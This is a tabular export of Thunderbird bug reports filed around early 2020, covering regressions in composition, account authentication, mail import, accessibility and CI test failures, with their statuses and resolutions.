1612152,Outlook import converts HTML entities in text/html messages,NEW,--,,"Thunderbird 60.9.1 converts HTML entities in Outlook text/html messages. For example, \&nbsp; is converted to \&amp;nbsp; so that the literal text \&nbsp; appears in the message display in Thunderbird. EXPECTED: Thunderbird should honor the content-type and not convert HTML entities in text/html content."
1612153,Help -> About -> Check for Updates updates 64-bit to 32-bit,RESOLVED,--,INCOMPLETE,"Thunderbird 60.9. Checked for update using Help -> About and was offered to update to 60.9.1, but after restarting I had been downgraded from 64-bit version to 32-bit."
1612167,"Main window resizes larger on opening than I set it before closing, sometimes half off screen.",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Set main window to size I want. Close Thunderbird. Open Thunderbird. Actual results: Window is twice the width. Half of it it off the screen. Expected results: As it did until recent update, the window should have opened the same size as it was when closed."
1612180,draft offline not saved in imap or offline not detected properly,UNCONFIRMED,--,,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Go offline on the computer not Thunderbird (here no WIFI; no active setting of Offline status); Offline mode is shown by Thunderbird automatically 2. Draft an email Actual results: Draft of email is not saved Expected results: Draft email should be saved. Draft emails are actually saved when I actively switch on Offline in Thunderbird (even if already shown). It appears that the automatic offline detection doesnt propagate properly to all offline functions.
1612185,yaml tests routinely fail,RESOLVED,--,DUPLICATE,"The yaml source-tests fail seemingly without rhyme or reason on Thunderbird jobs. I suspect it's got something to do with how the build is set up. M-C and C-C are checked out in /builds/worker/checkouts/gecko and /builds/worker/checkouts/gecko/comm. Then `mach lint -l yaml` gets run. The Python virtualenv gets created at `/builds/worker/checkouts/gecko/obj-x86_64-pc-linux-gnu/_virtualenvs`. The checkouts under /builds/worker/checkouts should be treated as readonly. I suspect something is happening due to that. Usually there's a workspace where the object directory can get created, but that's not the cache with the `lint` Docker image or jobs that run with `run-as: mach`."
1612234,Thunderbird is labeling so many e-mails spam now,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Nothing Actual results: So I'm not sure what has changed, but way too many pieces of good mail are being labeled as spam ever since I updated to the most major update. Sorry, I don't remember what version I was on before. It's in another bug thread if you really need me to dig for it. And there's no way to tweak the spam assassin settings right? So it's either I uncheck it & I start to get tons of spam (I assume), or I keep it checked & I have to deal with this. And I don't think TB is being trained when I tell it that they aren't spam & of course in some of my accounts it doesn't even move them from the junk to the inbox, so there's that issue. Expected results: Good mail that I never had issues with before (the sender) shouldn't be marked as spam. Or I tell it once or twice it's not spam & in the future, I shouldn't see them in my spam folder."
1612269,File attachement opens File instead of attaching it,UNCONFIRMED,--,,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: -Open a new Mail -Click on Attach File -Using Search in the top right corner to find the right file -Click on the file Actual results: The file opens (for example: click on a .pdf-file opens the acrobat reader with this file) Expected results: It should attach the selected file to the email.
1612306,notifications aren't properly stretched,RESOLVED,P1,DUPLICATE,"As can be seen in attachment 9123250 notifications are not properly visible anymore. That is showing one case, but you can easily see it elsewhere too: in the create new calendar (if you set ""Email: None"") and in the chat accounts dialog."
1612324,Il peer utilizza una versione non supportata del protocollo di sicurezza,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Auto instal last version of thunderbird in Beta Actual results: I can't send Email. I can only receive"
1612331,"Email address - only 1 recipient, only ""To"" supported",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: 73.0b1 Create new email. Enter ""To"" recipient. Attempt to change to ""Bcc"" or ""CC"" Attempt to add additional recip. Actual results: One ""To"" recipient allowed. Expected results: Should allow multiple recipients. Should allow each recipient to be To, CC, Bcc, etc."
1612359,Import Outlook Messages Crash,RESOLVED,--,DUPLICATE,Importing Outlook messages was broken between 63.0b1 and 64.0b1. Attempting the maneuver now results in a 100% reproducible crash. https://crash-stats.mozilla.com/report/index/79865ec4-1308-403c-b833-f3a860200129 https://crash-stats.mozilla.com/report/index/cbb51c68-2ce8-448b-b6e4-d65b50200129 https://crash-stats.mozilla.com/report/index/c33ec99d-bec4-424c-88ff-76e000200129 https://crash-stats.mozilla.com/report/index/49511d1c-00ec-49e5-b92f-d1ec00200129 https://crash-stats.mozilla.com/report/index/bbc1ff09-e4c5-4785-a8c9-182790200129 https://crash-stats.mozilla.com/report/index/96d8c1a3-e173-4bd3-a831-202440200129 https://crash-stats.mozilla.com/report/index/117addc0-f31c-4f00-a7d5-dfd600200129 https://crash-stats.mozilla.com/report/index/bf7d3f49-a48d-4441-b238-9f0b80200129 All the crashes are while I was narrowing the regression window.
1612369,Compfields2Recipients leaves old entries intact,RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I tried to use Compfields2Recipients to expand the mailing list items in the to, cc and Bcc fields of the email. Actual results: All the addresses were added to what was already there. Expected results: They should have replaced the items that were there. This appears to be because CompFields2Recipients is different now between comm-release/mail/components/compose/content/addressingWidgetOverlay.js and comm-release/suite/mailnews/components/compose/content/addressingWidgetOverlay.js Whereas it was the same in previous versions."
1612381,moving messages to mail folders has become error-prone and cumbersome since update,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363 Steps to reproduce: Since update to version 68.4.2, permanently pressing on a message to move it from the inbox to another folder in the unified folders tab often often results in unintended copying of the message into the wrong folder. Also once moved, the new folder now often tends to open automatically (which didn´t happen before the update), to display the moved message (sometimes opening the message in a new window), thus requiring one to scroll back to the inbox to re-open it for moving other messages. This makes inbox cleanup much more cumbersome than before, when messages would simply be dropped to the specified folder without opening it. Actual results: message might get accidentally dropped in the wrong folder before actually releasing the mouse. If moved, the new mail folder will open, instead of the inbox, requiring an additional step by the user to re-open the inbox folder to continue with message moving operations Expected results: message moved should simply drop in specified folder without opening the folder (nor the message),"
1612387,What an addon sends to console doesn't often appear,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I asked my addon to write a lot of stuff to the console so I could verify what it was doing. Actual results: Only a very small part of what I asked for appeared in the console, either error console or the developers console. Expected results: Items sent to the console should have appeared there - especially when actions either side of the console.log entry did happen, such as buttons being added to a new message window or some data being filled in for the options page."
1612394,wrong address when replying account identities,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: I'm using different identities on one account. I replied to an email from another identity. Actual results: The sender and recipient are reversed. So I will send the mail to myself and the from-field is the other identity. Expected results: The sender should be me and the to-field should be the other identity. This failure is not congruent. On some e-mails it happens on others not no matter if it has the exact same header-structure . The behavior (if the reversed address occurs or not) will stay the same for an e-mail in the folder. It seems to me to be very similar to the Bug #377998. But it was opened and fixed 13 years ago. Downgrading to the Version 60 let this behavior disappear.
1612406,"Thunderbird, 68.4.2 crashes after adding attachments",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Click ""Write"" to compose a new message. Fill in To, Subject, and Message. Click to add attachment, browse to select file, click ""Open"" Actual results: After clicking Open the program shuts down immediately with no warning. Sometimes it successfully adds one or two attachment but then crashes upon adding the third. Sometimes it crashes when adding the first. Expected results: The dialog box should close and the draft should now contain the attachment(s) ready to ""Send"""
1612409,Icon is created in C:\Users\Public\Desktop even if Public\Desktop is mapped to somewhere else (like D:),UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Install Thunderbird 68.4.2 64bits on a new laptop W10-1909 (onto which Thunderbird was not installed yet) and choose to create an Icon on desktop. Actual results: Icon is created in C:\Users\Public\Desktop which is quite often the location of Public Desktop but not necessarily... In my particular case I have indeed moved public desktop (and some other directories) onto another disk, ie. D:\Users\Public\Desktop. This move has been done using Windows itself, and then correct location of public desktop is set in registry. As a result, since C:\Users\Public\Desktop is NOT the real place of public desktop, icon is not visible on desktop. Expected results: Create the Icon in the actual place for public desktop, as defined in the registry."
1612410,autoadmin.global_config_url and permission.sqlite,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: Configure main account for the organization with an external file personal.js"" with autoadmin.global_config_url. Using the same configuration from thunderbird 15 until 60.5.2, without any problem. Update to version 61 or newer. Actual results: Every thing works fine, until an email has an attached image. It adds an entry with reference to imap folder into permission.sqlite in the table moz_perms, example: (xxxxxx are only for confidentiality) 'imap://xxxxxx%2Exxxxxx%40xxxxxx%2Ees@imap.xxxxxx.es:993/fetch%3EUID%3E.INBOX%3E19740','storageAccessAPI',1,2,1582982575992,1580390575992 When thunderbird starts after that, the main account (from personal.js) disappears. Expected results: Works fine like always. Deleting any imap reference into moz_perms table solves the problem, also deleting the file, but then the user loses autoload for images."
1612456,About & Preferences windows don't appear (on Mac) when there's a master password and security.prompt_for_master_password_on_startup is set to true,RESOLVED,--,WORKSFORME,"The ""About"" box no longer appears, when selected from main menu. OK in Daily 0127, problem appeared in Daily 0128. MacOS 10.14.6 It's a minor pain: current version can be got from Help -> Troubleshooting update on demand is lost; need to wait for update prompt to appear"
1612469,All of my previous emails were deleted without my request. I want them back!,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 Steps to reproduce: Looked for my emails. Actual results: They're ALL gone, some are a couple years old. I need them back. I do consulting work and rely on them . Expected results: My emails should still be there. No reason they were deleted."
1612480,browser.compose.begin* functions should not expand mailing lists,RESOLVED,--,FIXED,"You can pass a mailing list to the begin functions of browser.compose. Currently it expands the mailing list and adds all of the members to the message recipients. (Or it would if it were not broken.) This shouldn't happen, just the mailing list should be added to the message recipients."
1612526,Sent message is randomly not showing up in gmail Sent Mail,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Sent an email message Actual results: A copy shows up in All Mail but not Sent Mail on Google's IMAP server Expected results: A copy should appear in Sent Mail. Note I have been doing this for years - my client is set up properly to save copies in Sent Mail. It works most of the time. But recently it appears to be sporadically losing messages with no feedback or error message."
1612537,Preview of attached csv files disappeared,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: receive a csv file atached under the body of the message , seeing the content of the csv file Actual results: under the body of the message , not seeing the content of the csv file Expected results: under the body of the message , seeing the content of the csv file"
1612614,Person icon in mailing list dialog too big on HiDPI Macs,RESOLVED,--,FIXED,The person icon in mailing list dialog is too big on HiDPI Macs.
1612625,"""Add Security Exception"" dialog appears too many times to dismiss, if account is repeatedly checked for new messages",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: The email hosting service for the domain changed. Thunderbird was attempting to check the account every 10 minutes overnight. Actual results: When I came to the computer in the morning, Thunderbird had a dialog: ""Add Security Exception."" I cancelled this dialog, only for another to pop up. Attempted about a dozen times with the same result. Could not exit Thunderbird without doing an ""End Task"" from the operating system. Expected results: Two things: (1) The dialog box is too specific. It assumes the user may want to add a security exception. This is not a meaningful message for an end user, who may know nothing about what happened on the hosting/server end of things. Instead, it should describe what happened, and have a clear option for ""TAKE NO ACTION"" for users who may have no idea what's going on, and may need to contact a system administrator or similar. (2) If this issue happens, either Thunderbird should suspend its auto-checking until it gets some user feedback, or at least, it should not throw multiple instances of the same error message."
1612628,Update Verify failures Thunderbird beta,RESOLVED,--,WORKSFORME,"We see UpdateVerify errors on every beta. https://searchfox.org/mozilla-central/rev/2e355fa82aaa87e8424a9927c8136be184eeb6c7/taskcluster/taskgraph/transforms/update_verify_config.py#40-42 That's one problem. When testing an update from release channel to beta channel update-settings.ini will always have Firefox channels listed. So we need to overwrite mar-channel-id-override in those cases. The other issue is https://searchfox.org/comm-central/rev/4656a6fc05593b508b8a18928d9c9efebe3a7958/taskcluster/ci/build/kind.yml#65 I made that change in an attempt to fix this issue before, and I believe it was the wrong call because the reason for doing that would be to test RC builds which we don't do. I think to fix this we can use use a transform that runs after the update_verify_config transforms and set a new mar-channel-override value that just always gets set for Thunderbird betas."
1612630,Nested Numbered List Will not go above 2,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Click button to add Numbered List 2. Type ""item 1"" 3. Press Enter and Tab 4. Type ""item 1.1"" 5. Press Enter and Shift+Tab 6. Type ""item 2"" 7. Press Enter and Tab 8. Type ""item 2.2"" 9. Press Enter and Shift+Tab 10. Type ""item 3"" 11 Press Enter and Tab 12. Type ""item 3.1"" Actual results: Resulting List is: 1. item 1 1. item 1.1 2. item 2 1. item 2.1 2. item 3 1. item 3.1 Expected results: The third item should start with a 3. There should be a right click menu to restart/rejoin list?"
1612633,Translations missing in german-version (de) maybe in other translations of thunderbird too,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I found some untranslated menu-items like: Undo/Redo, Paste, Copy and Select All is not translated. (Main Menu, Popupmenu). Please see the attatched screenshots. Affected: German translation Actual results: The english/default translation is used. Expected results: The described menu-items and label should be translated."
1612708,Impossible to attach a file to a mail,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: I had tried to join e file to my mail, but it does not appears in the windows supposed to show which file was included in the mail. Beta version 73.0b2 Actual results: No file list of joint files ( finaly, no files included in the mail) Expected results: Get a list of files joint to the mail and joined files"
1612717,No way to re-authenticate OAuth2 accounts if the permission is revoked from the server side(?),RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: 1. Log into a Gmail account using OAuth2 2. Change the password of the Google account to log out all clients 3. Launch Thunderbird Actual results: Only a notification popped up saying 'Authentication failure while connecting to server imap.google.com'. Expected results: Apart from the notification, Thunerbird should re-initiate the OAuth2 flow to authenticate itself again."
1612719,Moving Emails from Accounts does not actually Delete Emails.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: I tried to move emails from one account to another. Sometimes they transfer is completed and the emails disappear. Other times, the count disappears and it stops transferring them. It is currently set to move emails deleted to the trash bin. I just changed it to delete them permanently in the settings for the email accounts. Actual results: With moving to the trash bin picked, moving emails between gmail to outlook account, would transfer. However come back later, and you would see the emails on Gmail being back there. Other times deleting permanently, would do nothing. Likewise, sometimes no error would appear when transferring files, and it would just stop. Expected results: Files moved between email accounts should be deleted, not be redownloaded, or still stay in the folder."
1612765,Extra recipients panel is not keyboard accessible,RESOLVED,--,FIXED,"STR 1) New msg 2) Shift+Tab to reach Extra recipients panel [>>], press Enter 3) try to select any extra recipient with keyboard-only methods (tab, cursor keys) Actual result - Extra recipients panel is not keyboard accessible afasics Expected result - cursor down/up should visibly focus the first/last item of the panel - cursor up/down for navigating panel items, Enter to confirm"
1612796,"Intermittent comm/mail/test/browser/composition/browser_saveChangesOnQuit.js | This test exceeded the timeout threshold. It should be rewritten or split up. If that's not possible, use requestLongerTimeout(N), but only as a last resort. -",RESOLVED,P5,WORKSFORME,**Filed by:** mkmelin+mozilla [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287277180&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/PWlrtwJcQIakEYV23klZTg/runs/0/artifacts/public/logs/live_backing.log ---
1612818,"""This message may be a scam"" warning should include details",RESOLVED,--,WONTFIX,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: I opened a message and this warning was displayed at the top: ""This message may be a scam"" which of course was a false positive. Actual results: There is a ""x"" button to dismiss the warning and a ""Preferences"" button which in turn unfolds two options: ignore warning for this message, or edit scam detection preferences. There is, however, no ""Details"" option that will tell me EXACTLY WHY Thunderbird thinks this message is a scam Expected results: There should be a ""Details"" option or something like that, that will tell me EXACTLY WHAT scam detection criteria the message matches, explained in understandable language. It's OBVIOUS that if you tell me that you think a message may be a scam you should also tell me why you think that. Also, how am I supposed to adjust my scam detection preferences (for example, to avoid this false positive in the future) if I don't even know what in this message was detected as suspicious? It's unbelievable that I have to tell you this."
1612853,Message format is not preserved in reply & forward,NEW,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 Steps to reproduce: 1. Open Tools\Options\Composition\General. 2. Under HTML section change text color. 3. Try forward or reply to some message. Actual results: Previous message color is overridden by composition color. Expected results: Format of previous message is kept. Composition format applies just to new content."
1612884,Error in errorCallback for fetchhttp when setting up Office 365 IMAP account,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Tools -> Account Settings -> Account Actions -> Add Mail Account... Your name: Foo Bar Email address: foo@bar.onmicrosoft.com Password: password Click ""Continue"". I've tried this with real credentials and I get the same error. Actual results: A dialog with: Error in errorCallback for fetchhttp TypeError: e(...) is null Expected results: Configuration succeeded."
1612906,Startup Crash in [@ je_free | nsINIParser_internal::DeleteString],RESOLVED,--,INCOMPLETE,"Signature first appears 68.0, all startup. Perhaps rare enough on the Firefox side to say it doesn't crash. https://crash-stats.mozilla.com/signature/?product=Thunderbird&signature=je_free%20%7C%20nsINIParser_internal%3A%3ADeleteString&date=%3E%3D2019-08-03T15%3A38%3A00.000Z&date=%3C2020-02-03T15%3A38%3A00.000Z#summary bp-509ae74b-ab48-4d4d-b80a-34a110200131. 73.0b1 ``` Top 10 frames of crashing thread: 0 mozglue.dll je_free memory/build/malloc_decls.h:54 1 xul.dll nsINIParser_internal::DeleteString xpcom/base/nsINIParser.cpp 2 xul.dll nsToolkitProfileService::MaybeMakeDefaultDedicatedProfile toolkit/profile/nsToolkitProfileService.cpp:612 3 xul.dll nsToolkitProfileService::SelectStartupProfile toolkit/profile/nsToolkitProfileService.cpp:1484 4 xul.dll XREMain::XRE_mainStartup toolkit/xre/nsAppRunner.cpp:3908 5 xul.dll XREMain::XRE_main toolkit/xre/nsAppRunner.cpp:4727 6 xul.dll XRE_main toolkit/xre/nsAppRunner.cpp:4823 7 thunderbird.exe NS_internal_main comm/mail/app/nsMailApp.cpp:324 8 thunderbird.exe wmain toolkit/xre/nsWindowsWMain.cpp:131 9 thunderbird.exe static int __scrt_common_main_seh f:/dd/vctools/crt/vcstartup/src/startup/exe_common.inl:288 bp-7e423431-fdaa-4149-9220-a9"
1612920,Outlook 365 authentication 68.4.2 broken,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Came into work this morning and my Thunderbird that was authenticating fine (I believe with an Office 365 app password) on Friday is not now. I checked the version on the work PC, and saw it was 68.4.2. When I went to my home computer (which I think was still receiving them fine), I saw it *was* 68.4.1, but was prompting for an update to 68.4.1. Sure enough, once I completed that update, now that one fails authentication the same way. I've tried about 5 new app passwords and none of them work. I've tried deleting the account from the password manager, changing the login to something else, trying to login (and failing of course) and then switching it back. None of these workaround attempts work. Actual results: Failure to authenticate, error message reads: Login to server imap-mail.outlook.com with username x@y.z failed. (Retry)/(Enter New Password)/(Cancel) Expected results: Authentication as usual."
1612942,Monospace Font Size Fails to Change Font Size in Plain Text Mail and Compositions,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: In Thunderbird 68.4.2, the Font Size related to Monospace in the user's mail containing plain text, as well as in composition of plain text messages, fail to honour the Font Size listed in Options > Display > Formatting > Fonts & Colours > Advanced... Actual results: Update Thunderbird to 68.4.2. Expected results: Font Size for Plain Text Messages would be maintined, and therein not now default to frightently tiny font size."
1612957,address list truncated,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I tried to recreate an address list but could not enter more than 7 entries. Actual results: ALL address lists are truncated to SEVEN entries !!!!
1613004,"Click on composition's attachment pane whitespace should first deselect selected attachments only, shows dialog prematurely",RESOLVED,P3,FIXED,"Deselecting attachments by clicking the whitespace fails. This is a regression. It still works correctly as designed in current release (68.4.2). Click-whitespace-to-attach has been a charming efficiency feature of TB since time immemorial. We can make it even better if we do nothing for multi-select misclicks (see comment 12; not yet included in my current patch). STR 1) composition, add attachments, select one 2) observe attachment pane whitespace tooltip, then click on whitespace Actual - tooltip correctly says ""Clear selection"" - first click however triggers the ""Attach File(s)"" dialog prematurely Expected - per tooltip, IF there's a selection, first click should deselect only, then the next click will show the dialog Note: - click on attachment-less pane shows dialog right away - click on whitespace when there's no selection will show dialog right away - for the impatient, double-click will *always* show the dialog right away - bug 1547699 was explicitly touching this code and should have noticed the regression vs. the described behaviour in code comments, but I can't tell what caused it. Btw: Some other behaviour of the carefully-crafted shortcut-operated attachment pane stat"
1613038,From gets From if Account is binded,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: I got 2 account binded. mail1@domain.com and mail2@domain.com. mail1@domain.com listens to mail1.1@domain.com (alias), too. Actual results: If i get a mail from mail2@domain.com to mail1.1@domain.com and click on ""answer"" all works fine... From is mail1@domain.com and To is mail2@domain.com But if i get a Mail from mail2@domain.com to mail1@domain.com it gets freaky if i click on answer... From gets mail2@domain.com and To mail1@domain.com... so it swapped completly wrong... Hope its understandful and someone can help ;) Expected results: if mail from mail2@domain.com gets to mail1@domain.com and ich click to answer mail1@domain.com shoild be = FROM and mail2@domain.com = TO"
1613045,No longer able to know who I write to (using a screen reader),RESOLVED,P1,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: With a screen reader such as orca on: 1. Reply to a mail (ctrl-r or reply to) 2. shift-tab until the fields where destination addresses are mentioned So far, the caret reached the addresses and spoke their status (to, Cc etc). Even in the new layout of the window. Now, shift-tab takes the caret on the labels, which should be buttons (cf bug 1611793) but no longer on any address. Impossible then to review the addresses you reply to or you are writing to. Actual results: The caret should be able to go on the addresses, expose them to the screen reader, and they should be removable via del key."
1613090,First available recipient input defaults to BCC instead of To when changing sender to non-default identity with auto-bcc-address,RESOLVED,--,WONTFIX,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Windows 10 OS Thunderbird version 68.4.2 In Account Settings window Select mail account name in left pane click on 'Manage identities' button Select any non default identity (Not an identity set as default) Under 'Copies & Folders' select 'Bcc these email addresses:' and enter an email address. click on all the OKs Click on Write select the non default identity as 'From' Bcc email address is auto entered....as expected. Actual results: However, the next field below is auto set to 'Bcc'. There is no auto display of an empty 'To' field below the preset Bcc. So, you always have to manually change the bcc to TO. Note: this does not occur if you set an auto Bcc with the 'default' identity. In that instance, the auto Bcc is displayed with an empty TO field below. Expected results: The non default identity selected in 'From' should auto display the Bcc as set...so far this is ok....but below that Bcc, the next field should be automatically an empty 'To' field. In addition.... whilst in same Write window, if you then change the 'From' from the non default identity to any other ema"
1613164,zoom images,UNCONFIRMED,--,,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I received an HTML email with an embedded image. The image is too small to read Actual results: I tried to use the mouse-wheel to zoom. The font sized increase but not the image. Expected results: Menu option to zoom the image. Or click and open the image in a new preview window with zoom buttons. Or mousewheel should increase the font and the image size. Or.... anything that avoids having to save the image to disk and use a different program. There's an add-on but outdated: https://addons.thunderbird.net/en-US/thunderbird/addon/image-zoom/
1613181,"""Use proxy for all protocols"" should not copy to SOCKS. (port bug 1610423 to Thunderbird)",RESOLVED,P3,FIXED,"+++ This bug was initially created as a clone of Bug #969282 +++ When using the setting ""use this proxy for all protocols"", putting in the IP/port of a SOCKS proxy doesn't work, even though the proxy details are copied to the SOCKS field. Which is to be expected, because this pref is actually for the HTTP/HTTPS/FTP protocols. A SOCKS proxy accepts all connections, so putting it with stuff it would override doesn't make much sense. Besides, while HTTP proxies can deal with HTTPS and FTP in a fashion, I have yet to see a proxy that can accept HTTP as well as SOCKS connections. So the copying of the HTTP proxy details into the disabled SOCKS field is a bit misleading since it isn't used. Perhaps the field should be disabled and made empty?"
1613190,gmail password issue - Impossible de configurer un compte GMAIL dans Thunderbird,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: J'utilise plusieurs compte GMAIL différents pour diverses activités. J'ai réussi à les configurer tous les 3 dans Thunderbird, mais j'ai du changer le mot de passe de l'un d'eux. Actual results: Depuis impossible de changer le mot de passe dans Thunderbird pour ce compte. En désespoir de cause, j'ai supprimé le compte pour le recréer mais impossible de le recréer, j'ai toujours le même message : ""Connexion au serveur impossible. La configuration, l'identifiant ou le mot de passe sont probablement incorrects"". J'ai tout vérifié, tout semble bon. J'ai même donné l'autorisation à Thunderbird dans les paramètres du compte Google concerné. J'ai reçu la confirmation suivante dans GMAIL : ""Mozilla Thunderbird Email a désormais accès à votre compte Google"". mais j'ai toujours le même message. Ci-joint le message d'erreur. Expected results: Je souhaite configurer ce compte dans Thunderbird."
1613213,Intermittent comm/mail/components/extensions/test/browser/browser_ext_messageDisplay.js | Test timed out -,RESOLVED,P5,WORKSFORME,**Filed by:** mkmelin+mozilla [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287380387&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/O8zi-nSeRhS1SASo-8G-OQ/runs/0/artifacts/public/logs/live_backing.log ---
1613217,Thunderbird - Provider Sunrise.ch - does not synchronize,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Windows 10. Thunderbird 68.4.2 installed. New account sunrise.ch according to https://www.sunrise.ch/de/privatkunden/hilfe/mobile/mobile-einrichten/hardware-support.html?seite=device/windows/thunderbird Actual results: ""Anmeldung auf dem Server imap.sunrise.ch mit Benutzernamen ""Hermann.Taaks@sunrise.ch"" fehlgeschlagen"" = registration on server imap.sunrise.ch with user name ---without success Expected results: synchronization, i.e. emails received on the sunrise mail server should be forwarded to my laptop"
1613243,Email address autocomplete suggestions have inconsistent ordering,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I type a name in the 'To' line within the message compose window. Thunderbird offers a set of matching names from the address book. Actual results: Thunderbird offers a set of matching names from the address book. However, it seems to offer these in an inconsistent order; I don't get the same ordering each time I start a new email. This is awkward when the word(s) which I type match many entries from the address book. I think that this is a regression; this used to work properly in the past, but perhaps not for the last few months. (i.e. it changed sometime in the autumn of 2019) Expected results: If I have multiple people in my address book called Dave, it should show these in some well-defined order. I would prefer if it showed the entries which had been used most recently at the top, because this would normally a useful suggestion. At the very least, given the same words typed into the 'To:' field, it should not randomise the list each time."
1613251,Thunderbird 68.4.2 will not open start page on web when English United States Dictionary 68 ESR is Activated,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Reinstalled thunderbird with add-ons disabled and it worked. When reactivating The dictionary the start page fails to show up. Disabling dictionary fixes issue"
